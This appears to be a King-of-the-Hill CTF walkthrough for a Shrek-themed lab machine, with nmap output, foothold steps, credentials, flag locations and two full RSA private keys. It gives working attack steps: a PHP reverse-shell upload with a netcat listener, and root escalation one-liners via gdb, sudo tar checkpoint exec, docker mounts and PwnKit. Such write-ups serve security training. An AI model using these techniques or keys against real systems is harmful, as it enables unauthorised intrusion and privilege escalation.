---
topic: koth
author: trap
---

<p></p>

## Nmap:

```
# Nmap 7.92 scan initiated Thu Feb 23 22:53:16 2023 as: nmap -p21,22,80,9999,65432 -sV -sC -T4 -Pn 

Nmap scan report for 10.10.145.145
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:cd:2a:1d:a1:fd:2b:82:c2:de:27:00:90:1b:52:a7 (RSA)
|   256 dd:99:85:18:26:9c:3c:7e:87:32:df:2b:43:18:b8:b8 (ECDSA)
|_  256 a2:35:a3:7b:19:af:58:31:fd:6c:40:55:59:4d:7d:52 (ED25519)
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.1.33)
| http-robots.txt: 1 disallowed entry 
|_/Cpxtpt2hWCee9VFa.txt
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.1.33
|3306/tcp  open  mysql   MySQL (unauthorized)
|8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
|8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
9999/tcp  open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 0
|     Content-Type: text/plain; charset=utf-8
|     Last-Modified: Thu, 12 Mar 2020 08:24:13 GMT
|     Date: Fri, 24 Feb 2023 03:53:29 GMT
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 0
|     Content-Type: text/plain; charset=utf-8
|     Last-Modified: Thu, 12 Mar 2020 08:24:13 GMT
|_    Date: Fri, 24 Feb 2023 03:53:28 GMT
65432/tcp open  unknown
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 23 22:55:03 2023 -- 1 IP address (1 host up) scanned in 106.89 seconds
```

## Footholds:
### Shrek

1. Go to /robots.txt on port 80 to get shreks id_rsa file. Or look below...
2. Copy the key, paste it in a new file and save it as `id_shrek`
3. `chmod 600 id_shrek` to give your new file the necessary permissions.
4. Login via ssh: `ssh -i id_shrek shrek@$RHOST` where $RHOST is the IP of the machine.


### Donkey

1. Port `80` there's an `/upload` page.
2. upload a rev shell called `rev.gif87a.php`
3. start netcat listner `nc -nlvp <port>`
3. `upload/uploads/rev.gif87a.php` will trigger rev shell.

### Puss

1. Port `65432` can be accessed using netcat `nc $RHOST 65432`

### Ftp

1. `curl -d "search=f" http://$RHOST/api/search.php` to reveal ftp credentials.  
2. Login to ftp `ftp $RHOST` and enter creds `ftp:EkRYje58bhFpg2uW`
3. `ls -la` to find message.txt
4. `Get message.txt` 
5. To exit ftp type `bye`
6. `cat message.txt` for Donkey's creds. `donkey:J5rURvCa8DyTg3vR`

### Tomcat

1. Port `8080` has a Tomcat page that can be logged in with `admin:tomcat`

## Privesc:
### pkexec

1. Quickest and easiest way to root but not the intended path for learning. [`PwnKit`][pwnkit]

### gdb

1. All users can escalate with this.

`gdb -nx -ex 'python import os; os.setuid(0); os.execl("/bin/sh", "sh", "-p")' -ex quit`

### Shrek

1. Can add a rev shell into `/home/shrek/check.sh` that can be used to escalate since root runs this script every minute

### Donkey

1. Donkey can run tar as root. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

### Puss

1. Puss is a member of the docker group `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`


## 8 flags


- /home/shrek/flag.txt `30 pts`
- /home/donkey/flag.txt `30 pts`
- /home/puss/flag.txt `30 pts`
- /srv/web/flag.txt `15 pts`
- /var/lib/mysql/cms `strings flag.idb` `30 pts`
- source code of index.html `encoded` `25 pts`
- /root/root.txt `70 pts`
- `/var/lib/docker/overlay2/8039e912cd29e964102163c37a1f05795ea99e7da6c1a800dd9749417d88c680/diff/root/flag.txt``20 pts`

## ssh keys

### shrek

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----
```

### puss

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3rYTsWn7Rc0ShhrLf5SM5lDLQFw6tuAmckGG7q7tsgDxzIBE
IpVkn8Y4XX8ZPnOOrzzw9NYS+jUNb0+3QxpRv576QsOmlkSoSLcxNfOLPKpqsAAJ
uJ7Bl8LhVfh23aSL5z2TYeeTSrPq5rxcWQE/hmq0kF8WChppEXaxhHjB7zhlj8in
XiOUtPxFFe9xgm6UQeSdV8M8SS6dG5EN1NUTf5I1EmzwK+RWzVp52GOlonyDr0gU
FueAvjvi9ZuEg6tcOjgxhFZOjf9HLUW+1e8hW9GfEqTya+nisTfguHoG+GvpXB0C
LqpY91hQtr1J0i29mdLGAJ048/amczjMuJmCNQIDAQABAoIBAElF6nDCh7NNZzzL
8AwHmdvk1RpVvdORJ9ULjhNVZkrcWLGJueEO+c4/bygDuxB7AITTLgu/qvq7HbJz
rb3cGO1MptX0fQiPijZyXzR67mKFRxikyo39XYBK08xvNNxzWLw53BWoFSPM0goc
Ct4VtQrKbKHbRusICW1/eaQ1/shvTnsePTpWJ7MRUNIk7nCMxeq/t7pw7I9ju3mI
gGM+uz2ZJzZOqJx/x0ogQDPJoIEd2Q7Z9twQ7+S4+rKQPz22mW+qYDq11OWVb0Ef
LLRZ+ue5asHZ2HzKWLbEy3WCSPQNVk4cYm4CyvDSvzV9GCukUVTypKaeXNrK4qJ8
TnVY78ECgYEA9drZ5IF0J2qfMgra5/TRpI+aTVO/NXWhxaRmoyh6Af60gfNLnWKp
J+qJFqZuf3Qwtencv3ocSraVeh0r3aM+LDUYD/LSOnUaj1iY2ckCArZ8KOXGH6i7
AdUqQZzqoJuUb3ztg1Nhu2iWs/3ezz6l1yOvCP9m5020RAqX3DSJkskCgYEA5+a9
+948bVjiPYfFSq5qNd647+RhBpvjJW482BhujsHB+qY+VFbqc3bOIWVeXKTmjQ5y
vhbrUL9h1ulCriSsRAK0qQwW4LH6AgFJvFUm4KZf849iG6dLyFE4H4sYgDGZBW44
WJ8lRVkGJCnexI73R1oMizILasg9/5BR50Jdng0CgYEAtUop/ivPQPmIZlhGz2Bh
7pzNxVOJ3ZveLGVsIcfJIAt3g5OqIGYOIhb5+6/CL024VYwbcT5T+mvkkWVNYWPs
hqCoG6qMhvqvGSDVpVJpnyJ9L5Mvo0zCiTlsrXFOOhw/Om6+nWYw3QbkidkcIWoq
1BfGDDZ45PsRgFLnZEOBZrECgYAK5DVsDOX9pL0LcsL7XPG0Ef/RlIJSEyQ579F/
vLYEkmkP4pruzx43yg6oVuB1rXD+kv0knGL06egoddAh6asFjrL5dY3lg7ZgPbs+
0yj+SBIdmFBdSCAxCk9+e8Ps0WeEb8bJsr/HYAT/0c+an7RRb5NDPlh27WysAhU2
rVFESQKBgGIQ4dIwhiaX7KVyG1QleWC8tJw6sMbzr3R1VKrKAV7NHOcBVfms9/bP
FhZrnDGHKkUAWZ6klGaTHcvq8fK6bas5LKkrNo5DPaiQFbD7x5Lyx4PdPupnxi91
k0hrZqy9vjpxtyIj8tfb3ccPeBiRYDwDyiiPmccOBRHJDwD+S89z
-----END RSA PRIVATE KEY-----
```

[pwnkit]: https://github.com/ly4k/PwnKit
